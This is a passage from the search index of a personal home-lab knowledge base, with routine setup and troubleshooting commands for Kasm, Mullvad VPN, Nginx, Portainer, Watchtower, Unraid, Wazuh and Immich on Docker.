<p>Replace the value of\u00a0<code>max_concurrent_docker_pulls</code>\u00a0in the agent config with the new value</p> <pre><code>sudo vi /opt/kasm/current/conf/app/agent.app.config.yaml\n</code></pre> <p>Start the Agent Services</p> <pre><code>sudo /opt/kasm/bin/start\n</code></pre> <p>If you tail the logs of the agent, after 30 seconds, and if you have multiple images pending will see notifications of images now being pulled</p> <pre><code>sudo docker logs -f kasm_agent\n</code></pre> <p>Kasm stop start</p>"},{"location":"Knowledge_Base/Home_Lab/Kasm_Workspaces/#troubleshooting","title":"Troubleshooting","text":"<p>Troubleshooting \u2014 Kasm 1.14.0 documentation</p>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/","title":"Mullvad VPN","text":""},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#installing-mullvad-vpn-on-ubuntu-linux","title":"Installing Mullvad VPN on Ubuntu Linux","text":"<p>Downloads | Mullvad VPN</p>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#download-the-mullvad-signing-key","title":"Download the Mullvad signing key","text":"<pre><code>sudo curl -fsSLo /usr/share/keyrings/mullvad-keyring.asc https://repository.mullvad.net/deb/mullvad-keyring.asc\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#add-the-mullvad-repository-server-to-apt","title":"Add the Mullvad repository server to apt","text":"<pre><code>echo \"deb [signed-by=/usr/share/keyrings/mullvad-keyring.asc arch=$( dpkg --print-architecture )] https://repository.mullvad.net/deb/stable $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/mullvad.list\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#install-the-package","title":"Install the package","text":"<pre><code>sudo apt update\nsudo apt install -y mullvad-vpn\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#configure-mullvad","title":"configure Mullvad","text":"<pre><code>mullvad account login &lt;account_number&gt;\nmullvad lan set allow\nmullvad relay set location us\nmullvad connect\nmullvad lockdown-mode set on\nmullvad status\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Mullvad_VPN/#uninstall","title":"Uninstall","text":"<pre><code>sudo apt purge mullvad-vpn\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/","title":"NGINX Server Engine-X","text":"<p>pronounced as \u201cEngine-X\u201d Install and configure Nginx | Ubuntu</p>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/#installing-nginx","title":"Installing Nginx","text":"<pre><code>sudo apt update\nsudo apt install nginx -y\n\ncd /var/www\nsudo mkdir tutorial\ncd tutorial\nsudo \"${EDITOR:-nano}\" index.html\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/#creating-our-own-website","title":"Creating our own website","text":"<p>Paste the following to the\u00a0<code>index.html</code>\u00a0file:</p> <pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n    &lt;title&gt;Hello, Nginx!&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Hello, Nginx!&lt;/h1&gt;\n    &lt;p&gt;We have just configured our Nginx web server on Ubuntu Server!&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/#setting-up-virtual-host","title":"Setting up virtual host","text":"<pre><code>cd /etc/nginx/sites-enabled\nsudo \"${EDITOR:-nano}\" tutorial\n</code></pre> <p><code>root</code>\u00a0is a directory where we have placed our .html file.\u00a0<code>index</code>\u00a0is used to specify file available when visiting root directory of site.\u00a0<code>server_name</code>\u00a0can be anything you want, because you aren\u2019t pointing it to any real domain by now.</p> <pre><code>server {\n    listen 5895;\n    listen [::]:5895;\n\n    server_name example.ubuntu.com;\n\n    root /var/www/tutorial;\n    index index.html;\n\n    location / {\n            try_files $uri $uri/ =404;\n    }\n}\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/#activating-virtual-host-and-testing-results","title":"Activating virtual host and testing results","text":"<pre><code>sudo service nginx restart\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/NGINX_Server_Engine-X/#resources","title":"Resources","text":"<p>Install and configure Nginx | Ubuntu</p>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/","title":"Portainer Docker","text":""},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#install","title":"Install","text":"<p>You must have Docker installed prior to installing Portainer</p> <p>create the volume that Portainer Server will use to store its database</p> <pre><code>docker volume create portainer_data\n</code></pre> <p>install portainer CE</p> <pre><code>docker run -d -p 8000:8000 -p 8443:8443 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ee:latest\n</code></pre> <p>check to see whether the Portainer Server container has started</p> <pre><code>docker ps\n</code></pre> <p>Log in https://localhost:9443</p> <p>Sources: Docker Linux Install CE</p>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#upgrade","title":"Upgrade","text":"<pre><code>docker ps -a\n\n#Locate the ones with name \"/portainer\"\n#0eab77c40087   portainer/portainer-ce      \"/portainer\"\n#take first 4 chars of the random string\n\ndocker stop 0eab\ndocker rm 0eab\n\ndocker pull portainer/portainer-ce:latest\n\ndocker run -d -p 8000:8000 -p 8443:8443 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ee:latest\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#upgrade-docker-compose-v1-to-v2","title":"Upgrade Docker Compose v1 to v2","text":"<pre><code>docker compose up -d\n</code></pre> <p>Update your package repositories and install\u00a0docker-compose-plugin</p> <pre><code>sudo apt update\nsudo apt install docker-compose-plugin\n</code></pre> <p>Check the installation succeeded by retrieving Docker Compose\u2019s version</p> <pre><code>docker compose version\nDocker Compose version v2.3.3\n</code></pre> <p>Now you can remove Docker Compose v1, unless you want to retain it to provide compatibility with legacy scripts. Both\u00a0docker-compose\u00a0(v1) and\u00a0docker compose\u00a0(v2) can co-exist if you need them to. If you\u2019re removing v1, it\u2019s normally found as a single binary at\u00a0/usr/local/bin/docker-compose</p> <pre><code>sudo rm /usr/local/bin/docker-compose\n</code></pre> <p>You could now set up a shell alias to redirect\u00a0docker-compose\u00a0to\u00a0docker compose. This would let you keep using scripts that expect Compose v1, using your new v2 installation</p> <pre><code>echo 'alias docker-compose=\"docker compose\"' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\ndocker-compose version\nDocker Compose version v2.3.3\n</code></pre> <p>You\u2019re now ready to start managing your containers with Compose v2</p>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#portainer-docker-upgrade","title":"Portainer Docker Upgrade","text":"<pre><code>docker ps -a\n\n#Locate the ones with name \"/portainer\"\n#0eab77c40087   portainer/portainer-ce      \"/portainer\"\n#take first 4 chars of the random string\n\ndocker stop 0eab\ndocker rm 0eab\n\ndocker pull portainer/portainer-ce:latest\n\ndocker run -d -p 8000:8000 -p 8443:8443 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ee:latest\n\n#All Done\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#watcher-watchtower-auto-docker-container-updates","title":"Watcher - WatchTower (Auto docker container updates)","text":""},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#deploy-watchtower","title":"Deploy Watchtower","text":"<pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#run-watchtower-in-debug-mode","title":"Run Watchtower in debug mode","text":"<p>You might wonder why there is no log output apart from the welcome message. If you want to increase the logging level or watchtower, you simply just add an argument.</p> <pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --debug\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#run-watchtower-only-once-in-debug-mode","title":"Run Watchtower only once, in debug mode","text":"<pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once --debug\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#exclude-container-from-watchtower","title":"Exclude Container from Watchtower","text":"<pre><code>docker run -d --label=com.centurylinklabs.watchtower.enable= false nginx\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Portainer_Docker/#scheduled-updates-and-clean-up-old-images","title":"Scheduled Updates and clean up old images","text":"<pre><code>docker run --name watchtower -v /var/run/docker.sock:/var/run/docker.sock --restart unless-stopped containrrr/watchtower --schedule \"0 0 4 * * *\" --debug --cleanup\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Synology_NAS/","title":"Synology NAS","text":""},{"location":"Knowledge_Base/Home_Lab/Unraid/","title":"Unraid","text":""},{"location":"Knowledge_Base/Home_Lab/Unraid/#docker","title":"Docker","text":""},{"location":"Knowledge_Base/Home_Lab/Unraid/#docker-service","title":"Docker service","text":"<pre><code>/etc/rc.d/rc.docker &lt;command&gt;\n</code></pre> <p>Available commands: ==start== ==stop== ==restart== ==status==</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#docker-containers","title":"Docker containers","text":"<pre><code>docker &lt;command&gt; &lt;containername&gt;\n</code></pre> <p>Available commands: ==start== ==stop== ==restart== ==pause== ==logs==</p> <p>Print all container names:</p> <pre><code>docker ps --format \u2018{{.Names}}\u2019\n</code></pre> <p>Print all container images:</p> <pre><code>docker ps --format \u2018{{.Image}}\u2019\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#nginx","title":"Nginx","text":"<pre><code>/etc/rc.d/rc.nginx &lt;command&gt;\n</code></pre> <p>Available commands: ==start== ==stop== ==restart== ==status==</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#php","title":"PHP","text":"<pre><code>/etc/rc.d/rc.php-fpm &lt;command&gt;\n</code></pre> <p>Available commands: ==start== ==stop== ==restart== ==status==</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#vm-service","title":"VM Service","text":"<pre><code>/etc/rc.d/rc.libvirt &lt;command&gt;\n</code></pre> <p>Available commands: ==start== ==stop==</p> <p>List all domains:</p> <pre><code>virsh list --all\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#domains","title":"Domains","text":"<pre><code>virsh &lt;command&gt; &lt;domain&gt;\n</code></pre> <p>Available commands: ==start== ==shutdown== ==reboot== ==suspend==</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#samba","title":"Samba","text":"<pre><code>/etc/rc.d/rc.samba &lt;command&gt;\n</code></pre> <p>Available commands: ==start== ==stop==</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#unraid","title":"Unraid","text":""},{"location":"Knowledge_Base/Home_Lab/Unraid/#shutdownreboot","title":"Shutdown/Reboot","text":"<pre><code>/sbin/&lt;command&gt;\n</code></pre> <p>Available commands: ==reboot== ==poweroff== ==shutdown==</p> <p>Note</p> <p><code>poweroff</code> If you get an unclean shutdown when issuing this command you need to adjust your timeout settings, see https://forums.unraid.net/topic/69868-dealing-with-unclean-shutdowns</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#run-diagnostics","title":"Run diagnostics","text":"<pre><code>diagnostics\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#tail-the-syslog","title":"Tail the syslog","text":"<pre><code>tail -f /var/log/syslog\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#look-at-the-parameters-in-the-config-file","title":"Look at the parameters in the config file","text":"<pre><code>nano /boot/syslinux.cfg-\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#create-a-backup-image-of-your-usb-and-store-it-on-disk1","title":"Create a backup image of your usb and store it on disk1","text":"<pre><code>dd if=/dev/sda of=/mnt/disk1/unraid.img\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#copy-files-using-midnight-commander","title":"Copy files using midnight commander","text":"<pre><code>mc\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#check-power-on-hours-for-all-drives","title":"Check power on hours for all drives","text":"<pre><code>for drive in $(ls -la /dev | grep -Ev 'sda|sd[a-z][0-9]' | grep sd[a-z] | awk '{print $10}'); do hours=$(smartctl --all /dev/${drive} | grep Power_On_Hours | awk '{print $10}'); echo \"Power on Hours for ${drive}: ${hours}\"; echo ''; done\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Unraid/#resources","title":"Resources","text":"<ul> <li>Unraid console commands</li> <li>selfhosters Unraid commands</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Unraid_Troubleshooting/","title":"Unraid Troubleshooting","text":"<p>Error: failed to register layer: write /usr/lib/x86_64-linux-gnu/libcudnn_engines_precompiled.so.9.6.0: no space left on device</p>"},{"location":"Knowledge_Base/Home_Lab/Unraid_Troubleshooting/#error-failed-to-register-layer-write-usrlibx86_64-linux-gnulibcudnn_engines_precompiledso960-no-space-left-on-device","title":"Error: failed to register layer: write /usr/lib/x86_64-linux-gnu/libcudnn_engines_precompiled.so.9.6.0: no space left on device","text":"<p>If you receive the error message above, you need to check if your Docker volume has enough space</p> <p></p> <p>Navigate to 'SETTINGS' &gt; 'Docker' &gt; Enable 'ADVANCED VIEW'</p> <p>Scroll down to 'Docker volume info' and check the 'btrfs filesystem show' section</p> <p>The default is usually 20 GB, if you dop see it full, follow the next steps</p> <pre><code>Label: none  uuid: xxxxxx-fea5-xxxxxxx-a7b4-xxxxxx\nTotal devices 1 FS bytes used 16.76GiB\ndevid    1 size 20.00GiB used 20.00GiB path /dev/loop2\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/","title":"Wazuh SEIM","text":""},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#wazuh-server-installation","title":"Wazuh Server Installation","text":""},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#resources","title":"Resources","text":"<ul> <li>OVA Virtual Machine (OVA) - Installation alternatives</li> <li>Docker Deployment on Docker - Installation alternatives \u00b7 Wazuh documentation</li> </ul>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#ova-installation","title":"OVA Installation","text":"<p>After installing the OVA, go into SSH to change the passwords for all services</p> <pre><code>curl -so wazuh-passwords-tool.sh https://packages.wazuh.com/4.4/wazuh-passwords-tool.sh\n#-ap is the password for shell wazuh-user\nsudo bash wazuh-passwords-tool.sh -a -au wazuh -ap wazuh\n\n#### Restart the server afterwards\n</code></pre> <p>WARNING: Wazuh indexer passwords changed. Remember to update the password in the Wazuh dashboard and Filebeat nodes if necessary, and restart the services. hope it helps anyone struggling.</p>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#restarting-wazuh-services","title":"Restarting Wazuh services","text":"<pre><code>sudo systemctl restart wazuh-manager\nsudo systemctl restart wazuh-indexer\nsudo systemctl restart wazuh-dashboard\nsudo systemctl restart filebeat\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#wazuh-agent-installation","title":"Wazuh Agent Installation","text":""},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#add-the-wazuh-repository","title":"Add the Wazuh repository","text":"<p>Install the GPG key</p> <pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import &amp;&amp; chmod 644 /usr/share/keyrings/wazuh.gpg\n</code></pre> <p>Add the repository</p> <pre><code>echo \"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main\" | tee -a /etc/apt/sources.list.d/wazuh.list\n</code></pre> <p>Update the package information</p> <pre><code>apt-get update\n</code></pre> <p>For Debian 7, 8, and Ubuntu 14 systems import the GCP key and add the Wazuh repository (steps 1 and 2)</p> <pre><code>apt-get install gnupg apt-transport-https\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -\necho \"deb https://packages.wazuh.com/4.x/apt/ stable main\" | tee -a /etc/apt/sources.list.d/wazuh.list\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#deploy-a-wazuh-agent","title":"Deploy a Wazuh agent","text":"<p>To deploy the Wazuh agent on your endpoint, select your package manager and edit the\u00a0<code>WAZUH_MANAGER</code>\u00a0variable to contain your Wazuh manager IP address or hostname.</p> <pre><code>WAZUH_MANAGER=\"10.10.10.49\" apt-get install wazuh-agent\n</code></pre> <p>If needed for additional deployment options such as agent name, agent group, and registration password Deployment variables for Linux - Deployment variables</p> <p>Enable and start the Wazuh agent service</p> <pre><code>systemctl daemon-reload\nsystemctl enable wazuh-agent\nsystemctl start wazuh-agent\n</code></pre> <p>The deployment process is now complete, and the Wazuh agent is successfully running on your Linux system.</p> <p>Recommended action\u00a0- Disable Wazuh updates Compatibility between the Wazuh agent and the Wazuh manager is guaranteed when the Wazuh manager version is later than or equal to that of the Wazuh agent. Therefore, we recommend disabling the Wazuh repository to prevent accidental upgrades. To do so, use the following command</p> <pre><code>sed -i \"s/^deb/#deb/\" /etc/apt/sources.list.d/wazuh.list\napt-get update\n\n#Alternatively, you can set the package state to\u00a0`hold`. This action stops updates but you can still upgrade it manually using\u00a0`apt-get\u00a0install`.\n\necho \"wazuh-agent hold\" | dpkg --set-selections\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#uninstall-a-wazuh-agent","title":"Uninstall a Wazuh agent","text":"<p>To uninstall the agent, run the following commands:</p> <p>Remove the Wazuh agent installation.</p> <pre><code>apt-get remove wazuh-agent\n\n#Some files are marked as configuration files. Due to this designation, the package manager does not remove these files from the filesystem. If you want to completely remove all files, run the following command:\n\napt-get remove --purge wazuh-agent\n</code></pre> <p>Disable the Wazuh agent service</p> <pre><code>systemctl disable wazuh-agent\nsystemctl daemon-reload\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/Wazuh_SEIM/#resources_1","title":"Resources","text":"<p>Deploying Wazuh agents on Linux endpoints - Wazuh agent</p>"},{"location":"Knowledge_Base/Home_Lab/immich/","title":"immich","text":"<p>Self-hosted photo and video management solution immich</p>"},{"location":"Knowledge_Base/Home_Lab/immich/#immich-installation","title":"immich installation","text":"<p>Open your browser to http://127.0.0.1:2283 and continue your setup.</p> <p>In order to recreate the container using docker compose, run <code>docker compose up -d</code>. In most cases docker will recognize that the .env file has changed and recreate the affected containers. If this should not work, try running <code>docker compose up -d --force-recreate</code></p>"},{"location":"Knowledge_Base/Home_Lab/immich/#docker","title":"Docker","text":""},{"location":"Knowledge_Base/Home_Lab/immich/#install-docker-compose","title":"Install Docker Compose","text":"<pre><code>sudo curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m)\" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#set-up-dockers-apt-repository-add-dockers-official-gpg-key","title":"Set up Docker's apt repository &amp; Add Docker's official GPG key","text":"<pre><code>sudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#add-the-repository-to-apt-sources","title":"Add the repository to apt sources","text":"<pre><code>echo \\\n\"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n$(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\nsudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#install-the-docker-packages","title":"Install the Docker packages","text":"<pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#create-the-docker-group","title":"Create the docker group","text":"<pre><code>sudo groupadd docker\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#add-your-user-to-the-docker-group","title":"Add your user to the docker group","text":"<pre><code>sudo usermod -aG docker $USER\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#activate-the-changes-to-groups","title":"activate the changes to groups","text":"<pre><code>newgrp docker\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#to-enable-docker-start-on-boot","title":"TO ENABLE DOCKER START ON BOOT","text":"<pre><code>sudo systemctl enable docker.service\nsudo systemctl enable containerd.service\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#install-immich-with-docker","title":"Install Immich with Docker","text":"<p>Immich directory and configuration files</p> <pre><code>mkdir immich\ncd immich\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#create-a-docker-composeyaml-file","title":"create a \u201cdocker-compose.yaml\u201d file","text":"<pre><code>nano docker-compose.yaml\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#docker-composeyaml-configuration","title":"docker-compose.yaml configuration","text":"<p>Update the <code>DB_PASSWORD</code> variable, enter a randomly created string that will serve as the password for your PostgreSQL user during the initial deployment.</p> <pre><code>name: immich\n\nservices:\nimmich-server:\n    container_name: immich_server\n    image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release}\n    # extends:\n    #   file: hwaccel.transcoding.yml\n    #   service: cpu # set to one of [nvenc, quicksync, rkmpp, vaapi, vaapi-wsl] for accelerated transcoding\n    volumes:\n    # Do not edit the next line. If you want to change the media storage location on your system, edit the value of UPLOAD_LOCATION in the .env file\n    - ${UPLOAD_LOCATION}\n    - /etc/localtime:/etc/localtime:ro\n    env_file:\n    - stack.env\n    ports:\n    - 2283:3001\n    depends_on:\n    - redis\n    - database\n    restart: always\n\nimmich-machine-learning:\n    container_name: immich_machine_learning\n    # For hardware acceleration, add one of -[armnn, cuda, openvino] to the image tag.\n    # Example tag: ${IMMICH_VERSION:-release}-cuda\n    image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release}\n    # extends: # uncomment this section for hardware acceleration - see https://immich.app/docs/features/ml-hardware-acceleration\n    #   file: hwaccel.ml.yml\n    #   service: cpu # set to one of [armnn, cuda, openvino, openvino-wsl] for accelerated inference - use the `-wsl` version for WSL2 where applicable\n    volumes:\n    - /volume25/docker/immich/upload:/usr/src/app/upload:rw\n    - /volume25/docker/immich/cache:/cache:rw\n    env_file:\n    - stack.env\n    restart: always\n\nredis:\n    container_name: immich_redis\n    image: docker.io/redis:6.2-alpine@sha256:e3b17ba9479deec4b7d1eeec1548a253acc5374d68d3b27937fcfe4df8d18c7e\n    healthcheck:\n    test: redis-cli ping || exit 1\n    restart: always\n\ndatabase:\n    container_name: immich_postgres\n    image: tensorchord/pgvecto-rs:pg16-v0.2.0\n    environment:\n    POSTGRES_PASSWORD: ${DB_PASSWORD}\n    POSTGRES_USER: ${DB_USERNAME}\n    POSTGRES_DB: ${DB_DATABASE_NAME}\n    POSTGRES_INITDB_ARGS: '--data-checksums'\n    volumes:\n    # Do not edit the next line. If you want to change the database storage location on your system, edit the value of DB_DATA_LOCATION in the .env file\n    - ${DB_DATA_LOCATION}\n    healthcheck:\n    test: pg_isready --dbname='${DB_DATABASE_NAME}' --username='${DB_USERNAME}' || exit 1; Chksum=\"$$(psql --dbname='${DB_DATABASE_NAME}' --username='${DB_USERNAME}' --tuples-only --no-align --command='SELECT COALESCE(SUM(checksum_failures), 0) FROM pg_stat_database')\"; echo \"checksum failure count is $$Chksum\"; [ \"$$Chksum\" = '0' ] || exit 1\n    interval: 5m\n    start_interval: 30s\n    start_period: 5m\n    command: [\"postgres\", \"-c\" ,\"shared_preload_libraries=vectors.so\", \"-c\", 'search_path=\"$$user\", public, vectors', \"-c\", \"logging_collector=on\", \"-c\", \"max_wal_size=2GB\", \"-c\", \"shared_buffers=512MB\", \"-c\", \"wal_compression=on\"]\n    restart: always\n\nvolumes:\nmodel-cache:\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#create-a-env-file","title":"create a \u201c.env\u201d file","text":"<pre><code>nano .env\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#env-file-configuration","title":"<code>.env</code> file configuration","text":"<p><code>openssl rand -base64 128</code> to generate random JWT Secret</p> <p>Make sure to update the location of where your files will be saved <code>UPLOAD_LOCATION=&lt;directory_path&gt;.</code>, for example, \u201cUPLOAD_LOCATION=/mystorage/images.\u201d</p> <pre><code>UPLOAD_LOCATION=/volume25/docker/immich/redis:/data:rw\nIMMICH_VERSION=release\nDB_PASSWORD=xxxxxx\nJWT_SECRET=xxxxxx\n\n# The values below this line do not need to be changed\n######################################################\nDB_HOSTNAME=immich\nDB_USERNAME=xxxxxx\nDB_DATABASE_NAME=xxxxxx\nDB_DATA_LOCATION=/volume1/docker/immich/db:/var/lib/postgresql/data:rw\nREDIS_HOSTNAME=redis\nIMMICH_WEB_URL=http://10.10.10.31:3000\nIMMICH_SERVER_URL=http://10.10.10.31:3001\nDISABLE_REVERSE_GEOCODING=false\nREVERSE_GEOCODING_PERCISION=3\nLOG_LEVEL=log\n</code></pre>"},{"location":"Knowledge_Base/Home_Lab/immich/#synology-nas-portainer-docker","title":"Synology NAS + Portainer + Docker","text":""},{"location":"Knowledge_Base/Home_Lab/immich/#install-container-manager","title":"Install Container Manager","text":""},{"location":"Knowledge_Base/Home_Lab/immich/#folder-structure","title":"Folder Structure","text":"<p>Create the following folder structure in 'File Station'. lowercase naming only!</p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/immich/#scheduled-tasks","title":"Scheduled Tasks","text":"<p>Control Panel &gt; Task Scheduler &gt; Create &gt; Scheduled Task &gt; User-defined script</p> <p></p> <ul> <li>General: In the Task field type in \u201cInstall Portainer\u201c. Uncheck the \u201cEnabled\u201d option. Select root User.</li> <li>Schedule: Select Run on the following date then select \u201cDo not repeat\u201c.</li> <li>Task Settings: Check \u201cSend run details by email\u201c, add your email, then copy paste the code below in the Run command area. After that, click OK.</li> </ul> <pre><code>docker run -d --name=portainer \\\n-p 8000:8000 \\\n-p 9000:9000 \\\n-p 9443:9443 \\\n-v /var/run/docker.sock:/var/run/docker.sock \\\n-v /volume1/docker/portainer:/data \\\n--restart=always \\\nportainer/portainer-ce\n</code></pre> <p></p> <p>warning pop up window will open. Click OK</p> <p></p> <p>Type your DSM password</p> <p></p> <p>select your \u201cInstall Portainer\u201d Task, then click the \u201cRun\u201d tab. You will be asked to run Install Portainer \u2013 click OK</p> <p></p> <p>Open your browser and type in https://Synology-ip-address:9443 or http://Synology-ip-address:9000</p> <p></p> <p>Click Get Started</p> <p></p> <p>click on the little pencil</p> <p></p> <p>On the Public IP area type in your own NAS Local IP</p> <p></p> <p>\u201cEnvironment updated\u201c</p> <p></p> <p>Dashboard is ready</p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/immich/#adding-portainer-registries","title":"Adding Portainer registries","text":"<ul> <li>Click on Custom registry. In the Name field area type in 'GHCR' and in the Registry URL area type in 'ghcr.io'</li> <li>Click Add registry</li> <li>Note: The 'ghcr.io' registry is mandatory if you want to update Docker containers via Portainer that are served via 'ghcr.io' registry.</li> </ul> <ul> <li>Click on Custom registry. In the Name field area type in 'CODEBERG' and in the Registry URL area type in 'codeberg.org'</li> <li>Click Add registry</li> <li>Note: The 'codeberg.org' registry is mandatory if you want to update Docker containers via Portainer that are served via 'codeberg.org' registry.</li> </ul> <ul> <li>Click on Custom registry. In the Name field area type in 'Quay.io' and in the Registry URL area type in 'quay.io'</li> <li>Click Add registry</li> <li>Note: 'The quay.io' registry is mandatory if you want to update Docker containers via Portainer that are served via 'quay.io' registry.</li> </ul> <p>Your Registries area will look like this</p> <p></p>"},{"location":"Knowledge_Base/Home_Lab/immich/#installing-immich","title":"Installing immich","text":"<p>Go to File Station and open the docker folder. Inside the docker folder, create one new folder and name it immich.</p> <p>Note: Be careful to enter only lowercase, not uppercase letters.</p> <p></p> <p>Now create five new folders inside the immich folder that you created at STEP 3 name them cache, db, micro, redis, upload.</p> <p>Note: Be careful enter only lowercase, not uppercase letters.</p> <p></p> <p>Log into Portainer using your username and password. On the left sidebar in Portainer, click on Stacks then + Add stack</p> <p></p> <p>In the Name field type in immich</p> <p>Paste the below in teh Web Editor Note: change the value numbers for user with your own UID and GID values.</p> <pre><code>name: immich\n\nservices:\nimmich-server:\n    container_name: immich_server\n    image: ghcr.io/immich-app/immich-server:${IMMICH_VERSION:-release}\n    # extends:\n    #   file: hwaccel.transcoding.yml\n    #   service: cpu # set to one of [nvenc, quicksync, rkmpp, vaapi, vaapi-wsl] for accelerated transcoding\n    volumes:\n    # Do not edit the next line. If you want to change the media storage location on your system, edit the value of UPLOAD_LOCATION in the .env file\n    - ${UPLOAD_LOCATION}\n    - /etc/localtime:/etc/localtime:ro\n    env_file:\n    - stack.env\n    ports:\n    - 2283:3001\n    depends_on:\n    - redis\n    - database\n    restart: always\n\nimmich-machine-learning:\n    container_name: immich_machine_learning\n    # For hardware acceleration, add one of -[armnn, cuda, openvino] to the image tag.\n    # Example tag: ${IMMICH_VERSION:-release}-cuda\n    image: ghcr.io/immich-app/immich-machine-learning:${IMMICH_VERSION:-release}\n    # extends: # uncomment this section for hardware acceleration - see https://immich.app/docs/features/ml-hardware-acceleration\n    #   file: 